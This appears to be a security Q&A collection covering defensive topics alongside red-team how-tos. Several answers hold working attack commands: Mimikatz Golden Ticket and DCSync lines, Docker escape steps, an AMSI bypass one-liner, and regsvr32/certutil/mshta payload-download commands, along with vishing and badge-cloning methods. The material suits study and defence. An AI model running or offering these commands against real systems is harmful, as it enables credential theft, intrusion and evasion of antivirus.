(6) Process anomalies -- unusual parent-child relationships (Word spawning cmd.exe, svchost.exe spawning PowerShell); unsigned processes in system directories; processes connecting to internet (Event Sysmon 3 for process + network). (7) Credential access -- LSASS access (Sysmon 10 with GrantedAccess 0x1010); SAM/NTDS.dit access; Task Manager dump. (8) Lateral movement -- PsExec/WMI/PowerShell remoting Event 4624 Logon Type 3 pattern. (9) File IOCs -- known malware hashes (VirusTotal); YARA rules on suspicious files; file drops in unusual locations (C:\Windows\Temp, user profile AppData\Local\Temp). Threat hunting: IOC-based hunt finds known-bad; behaviour-based hunt (TTP hunting) finds unknowns.
Explain CVSS scoring and how to prioritise vulnerabilities.

CVSS (Common Vulnerability Scoring System) v3.1 score components: Base score (inherent characteristics, 0-10): Attack Vector (Network/Adjacent/Local/Physical); Attack Complexity (Low/High -- conditions attacker must meet); Privileges Required (None/Low/High); User Interaction (None/Required); Scope (Unchanged/Changed -- does exploit affect other components?); Confidentiality/Integrity/Availability Impact (None/Low/High). Severity ratings: 0 (None), 0.1-3.9 (Low), 4.0-6.9 (Medium), 7.0-8.9 (High), 9.0-10.0 (Critical). Critical = usually Network attack vector, Low complexity, No privileges required, High CIA impact. CVSS limitations: base score does not account for: actual exploitation in the wild, presence in your environment, compensating controls. Better prioritisation with SSVC or EPSS: EPSS (Exploit Prediction Scoring System): ML model predicting probability of exploitation in the wild within 30 days; high CVSS + high EPSS = immediate priority. CISA KEV (Known Exploited Vulnerabilities catalog): CISA mandates federal agencies patch KEV within 2 weeks; if KEV = patch immediately regardless of CVSS. Risk-based prioritisation: CVSS score + EPSS score + asset criticality + exploitability + compensating controls = actual remediation priority. SLAs: Critical KEV: 24-72 hours; Critical non-KEV High EPSS: 7 days; High: 30 days; Medium: 90 days; Low: risk acceptance or next maintenance window.
How do you conduct a vulnerability scan with Nessus?

Nessus vulnerability scanning methodology: (1) Scan policy selection: Basic Network Scan (discovery + common vulns); Advanced Scan (full plugin set); Web Application Tests; Credentialed Patch Audit (requires domain or local admin credentials -- most thorough: detects patches, software versions, configuration issues). (2) Credential setup: SSH credentials (Linux) -- username/key or password; Windows: SMB credentials + ensure RemoteRegistry service running + File and Printer Sharing enabled. (3) Scan scope: target IPs, subnets, FQDN; exclude critical systems or test during maintenance windows. (4) Interpreting results: Critical (red) -- prioritise immediately (CVSS 9-10, often exploitable remotely without auth); High (orange) -- patch within 30 days; Medium (yellow) -- 90 days; Low/Informational -- accept or remediate at leisure; Info -- configuration data, no vulnerability. (5) Key plugins to review: 97833 MS17-010 EternalBlue; 10863 SSL certificate expiry; 51892 SSL RC4 cipher suites; 65821 SSL/TLS BEAST; 104743 Spectre/Meltdown; 50686 OpenSSH vulnerability. (6) Remediation workflow: export CSV/PDF; import into ticketing system (Jira, ServiceNow); assign to owners; track remediation; rescan to verify fix. (7) Compliance scans: CIS Benchmark, PCI DSS, SOC 2 compliance audit plugins. False positive management: suppress known FPs with evidence; tag accepted risks with business justification and re-review date.
Explain patch management and how to track compliance.

Patch management lifecycle: (1) Inventory -- know what you have; CMDB (Configuration Management Database) lists all assets, OS versions, installed software; discovery via SIEM, endpoint agent (Tenable.io, Qualys, CrowdStrike), Active Directory, cloud inventory. (2) Patch identification -- subscribe to vendor advisories (Microsoft Patch Tuesday, RHEL errata, Ubuntu USN); NVD/CVE feeds; CISA KEV catalog. (3) Prioritisation -- CVSS + EPSS + exploitability + asset criticality; patch Critical/High on internet-facing systems first. (4) Testing -- test patches in non-production environment; check for compatibility issues (Java version changes breaking applications, driver issues); staged rollout: canary group (5% of systems) then ring deployment. (5) Deployment -- automated deployment via WSUS (Windows), SCCM, Ansible, Puppet, Chef; patch windows scheduled during maintenance; rollback plan for failed patches. (6) Verification -- rescan with Nessus/Qualys after patching; confirm vulnerability closed. (7) Reporting -- patch compliance dashboards by department, criticality, age; SLA compliance: X% of Critical vulns patched within 7 days; executive reporting: overall compliance percentage. Metrics: mean time to patch (MTTP) by severity; patch coverage (% of assets with agents reporting); overdue patches by severity; exceptions with approved waivers and expiry dates. Common challenges: unsupported legacy systems (mitigate with network segmentation, compensating controls); third-party software (Java, Adobe, Chrome) often excluded from OS patching tools -- use separate tooling (Patch My PC, Ivanti).
How do you perform static application security testing (SAST)?

SAST analyzes source code without executing it to find security vulnerabilities. Tools by language: Python: Bandit (command: bandit -r./src -ll --skip B101); Semgrep with Python ruleset; Prospector. Java: SpotBugs with FindSecBugs plugin; PMD; SonarQube. JavaScript/TypeScript: ESLint with eslint-plugin-security; Semgrep; npm audit (dependency analysis). PHP: PHPCS with Security Audit; Psalm with taint analysis. Go: gosec (G304=file path injection, G401=weak crypto, G501=MD5 usage). C/C++: Flawfinder; Cppcheck; CodeQL. Universal: CodeQL (GitHub) -- semantic code analysis with QL queries; Semgrep -- lightweight, fast, open rules + custom rules in YAML; SonarQube Community -- supports 20+ languages, dashboard for tracking debt. SAST limitations: high false positive rate (10-80% depending on tool); misses runtime/business logic issues; cannot detect IDOR, missing authentication (logic flaws). Workflow integration: run in CI on every commit or PR; fail on new Critical/High findings; never fail on existing issues (noise); baseline existing issues; developers get inline PR comments. Custom rules: Semgrep custom rules in YAML define pattern + message; example: detect hardcoded IP addresses in code: pattern: var x = inet_addr($A) where $A matches 192.168.*. False positive management: mark suppressed findings with justification; review quarterly; use high-confidence rules only in blocking mode.
How do you perform dynamic application security testing (DAST)?

DAST tests running application by sending malicious inputs and observing responses -- black-box testing. Tools: OWASP ZAP (free, open-source): Spider + Active Scan; runs against staging URL; generates HTML/XML report; integrates with CI via ZAP API. Burp Suite Pro: comprehensive manual + automated; Scanner with active scan; Intruder for fuzzing; Repeater for manual testing; Collaborator for out-of-band detection; Organiser for notes. Nikto: command-line, quick wins: nikto -h https://target.com -ssl. Workflow: (1) Spider/crawl: discover all endpoints and forms; AJAX spider for JavaScript-heavy apps; authenticated crawl (set valid session cookie). (2) Active scan: send attack payloads to all discovered inputs; tests for SQLi, XSS, SSRF, XXE, command injection, path traversal. (3) Review findings: DAST generates many FPs; manually verify each finding in Burp; confirm exploitability before reporting. (4) Authenticated testing: configure ZAP/Burp with valid session; test endpoints behind login; test different privilege levels (regular user vs admin). (5) API testing: import OpenAPI/Swagger spec into ZAP; test all endpoints; check parameter validation, authentication, rate limiting. DAST limitations: cannot find logic flaws; limited coverage of complex JavaScript SPAs; cannot test thick client apps. Combine SAST + DAST + manual pentesting for comprehensive coverage (IAST -- Interactive Application Security Testing -- instruments running app to trace data flows, combines SAST accuracy with DAST's runtime context).
What is software composition analysis (SCA) and why is it important?

SCA (Software Composition Analysis) identifies and tracks open-source and third-party components in your codebase and detects known vulnerabilities in them. Why critical: modern applications are 70-90% open-source components; Log4Shell (CVE-2021-44228) affected 93% of enterprise cloud environments because Log4j was a transitive dependency of many Java applications (included by other libraries, not directly by developers). How it works: parses package manifests (requirements.txt, package.json, pom.xml, go.mod, Cargo.toml); resolves direct and transitive dependencies; matches component versions against NVD, GitHub Advisory Database, OSV (Open Source Vulnerabilities) for known CVEs. Tools: Snyk -- SaaS, excellent developer experience, auto-PRs for fixes, integrates with GitHub/GitLab/Bitbucket; Dependabot (GitHub native) -- free, auto-creates PRs for vulnerable dependencies; OWASP Dependency-Check -- open source, CLI and Jenkins plugin; Black Duck -- enterprise, broad language support; Trivy -- multi-purpose: container images, filesystems, git repos, SBOM. SBOM (Software Bill of Materials): structured inventory of all components; formats: SPDX, CycloneDX; required by US Executive Order 14028 for software sold to federal government; generated by: syft, CycloneDX tools. License compliance: SCA also detects license violations (GPL in commercial product, AGPL contamination); critical for legal risk management. Integration: run in CI pipeline; fail on new Critical CVEs with known exploits; alert on new High CVEs; track MTTR (mean time to remediate) for vulnerabilities.
How do you perform a vishing (voice phishing) attack in a red team?

Vishing (voice phishing) assessment tests whether employees will divulge sensitive information or perform actions over phone. Methodology: (1) Pretext development: identify target from LinkedIn, website, org chart; build believable caller identity (IT helpdesk, vendor, auditor, new colleague); research target person -- name, department, manager, recent projects (from LinkedIn/social media). (2) Spoofed caller ID: use services like SpoofCard or VoIP providers allowing CallerID configuration; display target company main number or IT helpdesk number. (3) Call scenarios (common): IT helpdesk calls user claiming to detect suspicious activity; asks for credentials to investigate remotely or to verify identity (answer security questions). Vendor calls AP (Accounts Payable) claiming to need bank account update for ACH payments (Business Email Compromise but voice variant). Internal IT impersonation to new employees -- they are unfamiliar with company procedures. (4) Execution: follow pretext script; use urgency (your account will be locked in 10 minutes); use authority (I am calling from the CISO office); document outcome (did they comply, give information, escalate?). (5) Reporting: document success rate by department; identify training gaps; provide targeted training for vulnerable departments. Legal: always have signed Rules of Engagement before vishing engagement; define what is in scope (which departments, which actions); stop if person shows distress.
Explain physical penetration testing methodology.

Physical penetration testing assesses physical security controls. Methodology: (1) OSINT for physical intel: Google Maps Street View for building entrances, parking, camera placement; LinkedIn for badge/uniform photos; dumpster diving (off-site) for documents with employee names, phone numbers, room numbers. (2) Tailgating/piggybacking: follow employee through badge-controlled door without badging; hold door open social convention overrides security; test: attempt entry during busy arrival time; employee smoking breaks (doors often propped open). (3) Badge cloning: HID Proxcard/iClass readers within 10cm with Proxmark3 can clone 125kHz proximity cards; long-range readers (Wiegotcha) at 30-90cm; test: stand behind target in queue, clone their badge; use on door reader. (4) Lock bypass: bump keys for pin tumbler locks; shim attacks on padlocks; under-door tool (UDT) for lever handles visible through door gap; bypass door latches with credit card or slim jim. (5) Social engineering: vishing to get visitor pass pre-authorised; impersonate delivery person (hi-vis vest, uniform, clipboard); impersonate fire safety inspector or maintenance crew. (6) Once inside: plant hardware implants (LAN Turtle, WiFi Pineapple, Bash Bunny plugged into desk network port); access unlocked workstations (screen saver policy test); attempt to find printed passwords, confidential documents, unlocked server rooms. (7) Report: document all access achieved with photos (GPS/timestamped); list controls that worked and failed; rate each finding by severity.
How do you implement perfect forward secrecy (PFS) and why is it important?

Perfect Forward Secrecy (PFS) ensures that compromise of a server long-term private key does not allow decryption of past recorded traffic. Without PFS: RSA key exchange encrypts session key with server RSA public key; adversary records encrypted traffic; later obtains server private key; decrypts all past sessions. With PFS (ECDHE): Elliptic Curve Diffie-Hellman Ephemeral; server generates temporary (ephemeral) key pair per session; client and server derive shared secret via DH; shared secret used as session key; ephemeral private key discarded after session; even with server long-term key compromise, past sessions cannot be decrypted (no ephemeral key available). Implementation: in TLS, PFS is provided by ECDHE or DHE cipher suites; configure web server to prefer ECDHE over RSA key exchange: Nginx: ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:...; ssl_prefer_server_ciphers on; Apache: SSLCipherSuite ECDHE+AESGCM:DHE+AESGCM; disable RSA key exchange cipher suites (they start with TLS_RSA_). TLS 1.3 mandates PFS -- all cipher suites use ECDHE or DHE; TLS 1.2 requires explicit cipher suite selection. Verify: nmap --script ssl-enum-ciphers -p 443 target.com | grep -E Key_Exchange; look for ECDH not RSA in key exchange column. Intelligence value: nation-state adversaries are known to record TLS traffic today hoping to decrypt with future key access; PFS prevents this retroactive decryption.
Explain certificate pinning and its tradeoffs.

Certificate pinning prevents SSL/TLS MITM attacks by hardcoding expected certificate or public key in the application rather than relying on OS trust store. Types: (1) Certificate pinning -- pin specific certificate; fails when certificate renews (certificate has expiry date); high maintenance burden. (2) Public key pinning -- pin public key; survives certificate renewal as long as key pair unchanged; preferred approach. (3) CA pinning -- pin issuing CA; less strict, allows cert renewal via same CA. Implementation: mobile apps (Android): define network_security_config.xml with <pin-set><pin digest=SHA-256>BASE64_HASH=</pin></pin-set>; iOS: NSURLSession with URLSessionDelegate and didReceiveChallenge. Web browsers (HPKP): deprecated in 2018 due to misconfiguration risk (site operators locked themselves out); removed from Chrome/Firefox. Testing bypass: Frida: objection -g com.app.name explore; android sslpinning disable (hooks TrustManager methods); iOS: ssl kill switch or objection ios sslpinning disable; SSL Kill Switch 2 for jailbroken iOS. Tradeoffs: advantages: prevents interception by compromised CAs or MITM on corporate networks; disadvantages: breaks legitimate corporate TLS inspection (enterprise proxy); pins expire when certificate renewed (outage risk); complex key rotation process; difficult to update pins remotely after app release; Google removed HPKP because sites frequently misconfigured it. Current best practice: implement for high-security mobile apps (banking, healthcare); include backup pins (current + next key pair); ship pin updates via app update before expiry.
How does Golden Ticket attack work and how do you defend against it?

Golden Ticket attack forges Kerberos TGTs (Ticket Granting Tickets) using the NTLM hash of the krbtgt account. The krbtgt account encrypts and signs all Kerberos tickets in a domain; with its hash, an attacker can forge TGTs for any user with any group membership, valid for any duration. Requirements: compromise of krbtgt account hash (typically obtained from DCSync on Domain Controller or direct NTDS.dit extraction). Attack steps: (1) Extract krbtgt hash: secretsdump.py domain/admin:pass@DC-IP -just-dc (gets NTDS.dit hashes); or Mimikatz lsadump::lsa /patch on DC. (2) Forge Golden Ticket: Mimikatz: kerberos::golden /domain:corp.local /sid:DOMAIN_SID /rc4:KRBTGT_HASH /user:administrator /id:500 /groups:512,519 /ptt (pass-the-ticket). (3) Use Golden Ticket: now authenticated as any user to any service; dir \\DC\C$ works; dcreplication, remote shell. Persistence: Golden Ticket valid for 10 years by default; survives password changes (krbtgt hash not changed); requires TWO krbtgt password resets to invalidate (two version history maintained). Defense: (1) Reset krbtgt password twice (24 hours apart to allow replication) immediately after any suspected DC compromise. (2) Privileged Access Workstations (PAWs) to prevent krbtgt hash extraction. (3) Monitor: Event 4769 with abnormal ticket lifetimes or encryption types; tickets with SIDs not in domain; Mimikatz-specific event patterns. (4) Microsoft Defender for Identity (MDI) detects Golden Ticket via Kerberos anomalies.
Explain DCSync attack and how to detect it.

DCSync attack replicates password data from Active Directory by abusing the DS-Replication-Get-Changes-All privilege -- the same right that domain controllers use to synchronise directory data. Rather than extracting NTDS.dit from disk, attacker mimics a domain controller and requests credential data via MS-DRSR protocol. Requirements: account with Replication-Get-Changes-All permission (usually: Domain Admins, Enterprise Admins, DC computer accounts; sometimes misconfigured admins or Exchange server accounts). Attack: Mimikatz on any domain-joined machine: lsadump::dcsync /domain:corp.local /user:Administrator (gets administrator NTLM hash); lsadump::dcsync /domain:corp.local /all /csv (gets all hashes -- equivalent to secretsdump). Impacket (from Linux, no domain join needed): secretsdump.py domain/user:pass@DC-IP -just-dc. What you get: all user NTLM hashes, Kerberos keys (AES128, AES256), historical password hashes (for cracking), krbtgt hash (enables Golden Ticket). Detection: Event ID 4662 -- An operation was performed on an object; Properties includes {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (Replication-Get-Changes-All) and {19195a5b-6da0-11d0-afd3-00c04fd930c9} (Replicating Directory Changes); Account_Name should only ever be a domain controller computer account (ending in $); any user account triggering 4662 with these GUIDs is anomalous. SIEM alert: EventCode=4662 Access_Mask=0x100 Object_Server=DS Account_Name NOT ending in $ -- high confidence DCSync detection.
How do you escape a Docker container?

Docker container escape techniques: (1) Privileged container: --privileged=true gives all Linux capabilities and access to host devices; escape: mount host filesystem: mkdir /tmp/hostfs; mount /dev/sda1 /tmp/hostfs (or /dev/xvda1, /dev/vda1); chroot /tmp/hostfs; then on host filesystem, add SSH key to root, write cron job. (2) Docker socket mount: /var/run/docker.sock mounted in container = full Docker API access; docker run -v /:/host --rm -it --privileged alpine chroot /host (creates new privileged container mounting host root). (3) hostPID: if container has hostPID: nsenter --target 1 --mount --uts --ipc --net --pid -- bash (PID 1 is host init process -- enters all namespaces). (4) cap_sys_admin capability: mount host filesystem via FUSE or procfs exploitation; also allows cgroup escape. (5) Writable host path: if sensitive path mounted (e.g., /etc is bind-mounted): write to /etc/cron.d/, /etc/sudoers.d/. (6) Kernel exploits: if kernel is vulnerable and no seccomp/AppArmor restrictions; CVE-2022-0847 DirtyPipe worked from containers. (7) runc CVE-2019-5736: overwrite runc binary from inside container during exec -- host code execution. Enumeration tools: deepce.sh (Docker escape enumeration script); linpeas from within container. Defenses: never use --privileged; do not mount Docker socket; use seccomp and AppArmor profiles; run as non-root user inside container; use rootless Docker.
What are Kubernetes RBAC misconfigurations that lead to cluster compromise?

Kubernetes RBAC misconfigurations: (1) Wildcard permissions: ClusterRole with rules: - apiGroups: [*] resources: [*] verbs: [*] -- full cluster control for anyone with this binding; any pod in bound namespace can create privileged pods, read all secrets, exec into any pod. (2) Secrets read permission: if service account has get/list on secrets in kube-system namespace: kubectl --token=... get secrets -n kube-system gets cluster-admin token or other credentials. (3) Create pod permission: ability to create pods allows scheduling privileged pod mounting host filesystem or docker socket -- cluster escape. (4) Impersonation rights: impersonate verb allows acting as any user/service account; effectively grants that user permissions. (5) Exec rights: exec verb on pods allows running commands in any pod -- equivalent to SSH access. (6) ClusterRoleBinding to default service account: if default service account is bound to cluster-admin role, any pod without explicit service account inherits cluster-admin. Exploit chain: compromise web application pod; read mounted service account token at /var/run/secrets/kubernetes.io/serviceaccount/token; use token with kubectl to enumerate permissions; exploit overly permissive RBAC. Detection: kubectl get clusterrolebindings -o json | jq to audit bindings; rbac-police tool; kube-bench for CIS benchmarks; audit log shows API calls with username and resource. Mitigation: principle of least privilege for every service account; do not automount service account tokens if not needed (automountServiceAccountToken: false in pod spec); use namespaced Roles instead of ClusterRoles; regular RBAC audit.
How do you audit an AWS account for security misconfigurations?

AWS account security audit checklist: IAM: (1) Root account -- is MFA enabled? (IAM dashboard); are access keys for root? (delete them); root used recently? (CloudTrail: eventSource=sts.amazonaws.com userIdentity.type=Root). (2) IAM users -- all have MFA enabled? aws iam generate-credential-report; download CSV; check mfa_active column. (3) Access keys -- unused or old? keys older than 90 days should be rotated; aws iam list-access-keys --user-name USER and check LastUsedDate. (4) Password policy -- minimum 14 chars, complexity, rotation. S3: (5) Public buckets -- aws s3api list-buckets then aws s3api get-bucket-acl + get-bucket-policy for each; or AWS Trusted Advisor; Config rule: s3-bucket-public-read-prohibited. (6) Encryption at rest -- server-side encryption enabled? S3 Block Public Access settings at account level. Network: (7) Security groups -- 0.0.0.0/0 ingress on port 22 or 3389? aws ec2 describe-security-groups | jq; Config rule: restricted-ssh, restricted-rdp. (8) VPC Flow Logs enabled? (9) Default VPCs -- remove or isolate default VPCs in all regions. EC2: (10) IMDSv2 required? (prevents SSRF-based metadata exfiltration). Logging: (11) CloudTrail enabled in all regions? Multi-region trail? Log integrity validation? S3 access logging on CloudTrail bucket? (12) GuardDuty enabled in all regions? (13) Config enabled? Tools: Prowler (open-source, comprehensive AWS/Azure/GCP audit -- 400+ checks); ScoutSuite; AWS Security Hub with FSBP (Foundational Security Best Practices).
How do you analyse a suspicious PowerShell script?

PowerShell malware analysis methodology: (1) Initial triage: file malware.ps1; check file size, encoding (UTF-8, UTF-16 BOM); strings malware.ps1 to see readable content. (2) Detect obfuscation: base64 encoded commands (often in -EncodedCommand or [System.Convert]::FromBase64String()); string concatenation to build commands at runtime; character code replacement ([char]104 = h); GZIP/deflate compressed payloads; invoke-expression (IEX) or Invoke-Expression aliases (& $x,. $x). (3) Deobfuscation: PowerShell ISE or VS Code; replace IEX with Write-Host or Out-File to print decoded payload without executing; or: $code = [System.Convert]::FromBase64String(BASE64); [System.Text.Encoding]::Unicode.GetString($code) -- decode without executing. (4) Dynamic analysis: ProcMon to see file system and registry activity; Wireshark for network connections; Process Monitor filters: include process name powershell.exe; look for file writes, registry modifications, network connections. (5) Sandboxing: upload to Any.run or Triage sandbox (safe execution environment); observe behavior, network connections, dropped files. (6) Script block logging: enable PowerShell ScriptBlock Logging (HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging: EnableScriptBlockLogging=1); Event ID 4104 logs all script blocks including deobfuscated ones -- attacker code is logged in plaintext even if obfuscated on disk. (7) AMSI: Antimalware Scan Interface scans script content; look for AMSI bypass attempts (amsiInitFailed, amsi.dll reflection patching). Extract IOCs: C2 URLs, dropped file paths, registry keys, encoded payloads for hashing.
How does ransomware evade antivirus detection?

Ransomware AV evasion techniques: (1) Packing and encryption: UPX or custom packer compresses executable; static signature on original code not present; payload only exists in memory after unpacking; AV must detect unpacking behavior or unpack for analysis (some AVs do). (2) Polymorphism: code mutates with each infection -- variables renamed, instructions reordered, junk code inserted; each variant has different hash; static signatures fail. (3) Fileless execution: payload injected into legitimate process memory; no executable on disk; LOLBins (Living Off the Land Binaries) like PowerShell or mshta.exe execute payload; AV file scanning finds nothing; only behavioral detection catches it. (4) Code signing: steal or purchase legitimate code signing certificate; signed binary appears trusted; Microsoft defender and some AVs lower scrutiny for signed files. (5) Sleep and environmental checks: payload sleeps for minutes or hours before executing; AV sandboxes have time limits; check for sandbox artifacts (no mouse movement, no network activity, VM-specific registry keys); if sandbox detected, execute benign code. (6) Process injection: inject shellcode into explorer.exe or svchost.exe; AV monitors network/file activity of unknown processes but not system processes. (7) Legitimate tool abuse: use built-in Windows tools for malicious actions: vssadmin delete shadows /all (VSS deletion via legitimate admin tool); wbadmin delete catalog (remove backup catalog). Detection approaches: behavioral detection (encryption activity patterns -- high entropy writes, multiple file renames); honeypot files (decoy files with canary tokens that alert on modification); EDR process monitoring.
Explain DNS tunneling and how to detect it.

DNS tunneling encodes data in DNS query/response to exfiltrate data or create C2 channel through DNS, which is almost always allowed outbound. Mechanism: attacker registers domain (evil.com) NS server they control; compromised host encodes data in DNS queries: curl.base64data.evil.com (data in subdomain label); queries reach attacker NS server which decodes data; NS server encodes response in DNS A or TXT records; compromised host decodes response; full bidirectional channel over DNS. Tools: iodine (tunnel TCP/IP over DNS); dnscat2 (C2 over DNS, encrypted); DNSExfiltrator; packetcrypt. Detection: (1) High query volume per domain -- legitimate domains have low query rate; DNS tunnel generates many queries; threshold alert: >100 queries/minute to single domain from single host. (2) High-entropy subdomain labels -- random base64 data in subdomain (aGVsbG8gd29ybGQ) has high Shannon entropy (close to 4.5 bits/char); normal hostnames have low entropy (www, mail, api); calculate entropy of leftmost subdomain label: alert if >3.5 bits/char. (3) Unusual query types -- TXT queries are unusual for workstations; MX queries from non-mail servers; NULL, PRIVATE type queries. (4) Long FQDN -- DNS tunneling generates very long FQDNs (often >50 chars); alert on queries where total FQDN length >50. (5) NXDOMAIN rate -- unique subdomains with NXDOMAIN (not found) can indicate DGA or tunnel. Tools: Zeek (Bro) with DNS log analysis; JA3 DNS signatures in Suricata; Elastic ML for DNS anomaly detection.
How do you test and harden TLS configuration?

TLS configuration testing: Tools: testssl.sh target.com:443 (comprehensive -- cipher suites, protocols, vulnerabilities, cert details); nmap --script ssl-enum-ciphers -p 443 target.com; SSL Labs ssllabs.com/ssltest for external sites (industry standard); sslscan --show-certificate target.com. Vulnerabilities to test for: Protocol versions: SSLv2 (DROWN), SSLv3 (POODLE), TLS 1.0 (BEAST, POODLE), TLS 1.1 -- all should be disabled; only TLS 1.2 and 1.3. Cipher suites: disable RC4 (BEAST), 3DES (SWEET32), NULL ciphers, EXPORT ciphers (FREAK), ANON ciphers (no auth); prefer ECDHE_RSA or ECDHE_ECDSA with AES-GCM (AEAD). Vulnerabilities: BEAST (TLS 1.0 CBC); CRIME/BREACH (TLS compression -- disable compression); POODLE (SSLv3 CBC + TLS 1.0 fallback); DROWN (SSLv2 on same key); ROBOT (RSA PKCS#1 v1.5 padding oracle); Heartbleed (OpenSSL < 1.0.1g -- check version). Hardening configuration (Nginx): ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384; ssl_prefer_server_ciphers off (TLS 1.3 ignores this); ssl_session_cache shared:SSL:10m; ssl_session_timeout 1d; ssl_dhparam /etc/nginx/dhparam.pem (2048-bit DH params); add_header Strict-Transport-Security max-age=63072000 includeSubDomains preload; add_header X-Content-Type-Options nosniff; add_header X-Frame-Options DENY. Mozilla SSL Configuration Generator provides ready-made configs.
What is an insider threat and how do you detect one?

Insider threat: current or former employee, contractor, or business partner who intentionally or accidentally compromises security. Types: (1) Malicious insider -- intentional data theft, sabotage, fraud; motivated by financial gain, grievance, ideology. (2) Negligent insider -- accidental data exposure, falling for phishing, misconfiguration; no malicious intent but same business impact. (3) Compromised insider -- external attacker using insider credentials (hardest to distinguish from legitimate user). Detection indicators: (1) Unusual data access -- accessing data outside normal role (DBA accessing HR compensation data); accessing large volumes of files (mass download); accessing data at unusual hours (3 AM). (2) Data exfiltration signals -- large uploads to cloud storage (Google Drive, Dropbox, OneDrive personal); email with large attachments to personal address; USB drive usage (DLP alert). (3) Privilege escalation attempts -- querying for permissions they do not have; searching for admin credentials. (4) Behavioural anomalies -- UEBA (User and Entity Behaviour Analytics) baselines normal activity per user; alerts on deviations: logging in from new country, accessing 10x normal volume of files, first-time access to sensitive database. (5) Pre-departure signals -- employees accessing proprietary information near resignation; sending to personal email; copying to external storage. Technical controls: DLP (Data Loss Prevention) policies on email and endpoint; CASB (Cloud Access Security Broker) for cloud storage monitoring; privileged access management (PAM) with session recording for admin accounts; zero-trust with need-to-know access.
How do you conduct a red team exercise?

Red team exercise simulates a full adversary attack against an organization to test people, process, and technology. Differs from penetration test: penetration test finds vulnerabilities; red team tests whether defenses (people, SOC, IR process) detect and respond to sophisticated attack. Types: (1) Assume-breach: start with foothold on internal network (simulates phishing success); test lateral movement, detection, response. (2) Full-spectrum: red team attempts initial access, lateral movement, objectives; blue team attempts detection and response; measures MTTD (mean time to detect) and MTTR (mean time to respond). (3) Purple team: collaborative -- red and blue work together; red performs technique; blue validates if detection fires; gaps documented and closed immediately. Planning: define objectives (steal domain admin credentials, access financial system, exfiltrate specific data); define rules of engagement (what is out of scope -- production databases, specific systems); define timeline (4-8 weeks typical); define notification list (who knows red team is operating -- usually CISO and small trusted group). Execution phases: initial access (phishing, external exploitation); persistence; privilege escalation; lateral movement; objective achievement. Tools: Cobalt Strike (commercial, industry standard), Sliver (open source), Havoc; custom tooling. Reporting: executive summary (what was achieved, business risk); timeline of attack path; detection gaps (what was not detected); MITRE ATT&CK heatmap of techniques used vs detected; remediation roadmap.
Explain network segmentation and microsegmentation.

Network segmentation divides network into zones to limit blast radius of compromises and control traffic between zones. Traditional segmentation: VLAN-based -- separate VLANs for user workstations, servers, DMZ, management, OT/ICS; firewall between zones enforces policy; perimeter firewall protects internet-facing zone. DMZ (Demilitarized Zone): web servers and public-facing services in DMZ; separate from internal network; inbound connections from internet allowed to DMZ; DMZ to internal only specific required protocols (not open access); even if web server compromised, attacker cannot freely access internal network. Microsegmentation: granular, workload-level segmentation; east-west traffic filtered at individual workload (VM, container, process); policy defined by workload identity not IP address; implemented via: (1) Host-based firewall (Windows Defender Firewall, iptables) -- but complex to manage at scale; (2) Software-defined networking (VMware NSX, Cisco ACI) -- centrally managed policy applied to each VM; (3) Service mesh (Istio, Linkerd) for Kubernetes -- mTLS between all pods, policy controls which services can communicate; (4) Cloud security groups -- AWS security groups are effective microsegmentation (by default: deny all inter-group traffic). Benefits: if attacker compromises workstation, cannot reach database servers or other workstations (limits lateral movement); ransomware cannot spread to servers. Implementation priority: segment user workstations from servers; segment production from dev/test; segment cardholder data environment (PCI DSS requirement); block workstation-to-workstation (SMB) traffic.
How do you bypass Windows Defender antivirus?

Windows Defender bypass techniques (for authorized red team): (1) AMSI bypass: Defender uses AMSI to scan PowerShell/VBScript; patch amsi.dll in memory: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)} (sets amsiInitFailed=true, skips scanning); or: patch AmsiScanBuffer function in amsi.dll with ret instruction via VirtualProtect. (2) Defender exclusion abuse: add exclusion folder: Add-MpPreference -ExclusionPath C:\Windows\Temp; place payloads in excluded paths; requires admin access. (3) Obfuscation: invoke-obfuscation PowerShell obfuscation; Chameleon (Python tool): randomise variable names, insert junk code, encode strings; change entropy; recompile binaries with different compiler flags. (4) Process injection: inject shellcode into signed processes (explorer.exe, notepad.exe); Defender less aggressive on trusted processes. (5) Signed binary proxies (LOLBAS): regsvr32.exe /s /n /u /i:http://url/file.sct scrobj.dll; certutil -urlcache -split -f URL payload.exe; mshta http://url/payload.hta. (6) COM object hijacking: register malicious COM server in HKCU registry; legitimate process loading COM object loads malicious DLL instead. (7).NET unmanaged code: load.NET assembly reflectively: [System.Reflection.Assembly]::Load(bytes) without writing to disk; may still be scanned in memory. (8) Commercial C2 profiles: Cobalt Strike malleable profiles with custom HTTP headers, URIs mimic legitimate traffic; Defender struggles with encrypted beaconing that blends with normal HTTPS.
Explain how to use Bloodhound for Active Directory attack path analysis.

BloodHound uses graph theory to find attack paths in Active Directory. Components: SharpHound (data collector) runs on domain-joined Windows machine as domain user; BloodHound GUI (Neo4j graph database backend) visualises paths. Data collection: SharpHound.exe --CollectionMethod All (comprehensive -- queries LDAP for all users, groups, GPOs, sessions, ACLs; uses SMB to enumerate local admin access); --CollectionMethod DCOnly (LDAP only -- stealthy, no host contact); produces ZIP file of JSON. Import: drag ZIP into BloodHound GUI; loads into Neo4j. Pre-built queries (Analysis tab): Find all Domain Admins; Find Shortest Paths to Domain Admins; Find Principals with DCSync Rights; Find AS-REP Roastable Users; Find Kerberoastable Users with most privileges. Cypher queries (custom): MATCH p=shortestPath((u:User {name:'USER@DOMAIN'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN'})) RETURN p (shortest path from specific user to DA); MATCH (u:User) WHERE u.hasspn=true AND u.admincount=true RETURN u.name (Kerberoastable users that are also admins). Attack path example: User A -> member of Group B -> Group B has GenericAll on User C -> User C -> member of Domain Admins; exploitation: User A abuses GenericAll to reset User C password, log in as User C, gain DA. ACL abuse edges: GenericAll (full control); GenericWrite (write properties); WriteDACL (modify ACLs); ForceChangePassword; AddMember; AllExtendedRights; ReadLAPSPassword. Remediation: remove unnecessary group memberships; audit ACL delegations; implement tiered administration model.
